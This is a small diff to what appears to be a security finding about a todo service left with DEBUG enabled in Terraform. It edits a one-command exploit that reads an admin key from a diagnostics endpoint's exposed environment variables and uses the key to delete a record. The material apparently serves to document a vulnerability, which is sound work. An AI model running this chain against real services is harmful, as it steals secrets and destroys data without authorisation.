@@ -103,8 +103,7 @@ V-PLT-01 (DEBUG=true in Terraform)
 
 ```bash
 # Full exploit in one command
-KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | \
-  python3 -c 'import sys,json; print(json.load(sys.stdin)["environment_variables"]["TODO_ADMIN_KEY"])')
+KEY=$(curl -s "$SERVICE_URL/api/v1/system/diagnostics" | jq -r '.environment_variables.TODO_ADMIN_KEY')
 
 curl -i -X DELETE "$SERVICE_URL/api/v1/todos/1" -H "X-Admin-Key: $KEY"
 ```
